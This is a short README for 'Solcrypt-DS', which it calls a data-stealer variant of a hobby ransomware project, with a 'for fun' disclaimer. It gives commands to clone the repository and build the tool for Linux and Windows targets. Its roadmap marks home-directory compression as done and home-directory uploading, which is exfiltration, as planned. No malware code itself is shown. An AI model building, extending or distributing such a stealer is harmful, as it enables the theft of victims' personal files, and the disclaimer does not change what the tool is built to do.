# Solcrypt-DS
A datastealer variant of a "hobby project" ransomware that isn't really meant to be used for illegal purposes. I made this for fun, ok? Don't get me in legal trouble for it

## Setup
### Arch
```
sudo pacman -S rustup
rustup default stable
rustup target add x86_64-pc-windows-gnu # if compiling for windows targets
git clone https://git.xorycode.dev/xory/solcrypt-ds
cd solcrypt-ds
cargo build --release
cargo build --release --target x86_64-pc-windows-gnu
```

## Roadmap
- [X] Home directory compression
- [ ] Home directory uploading
 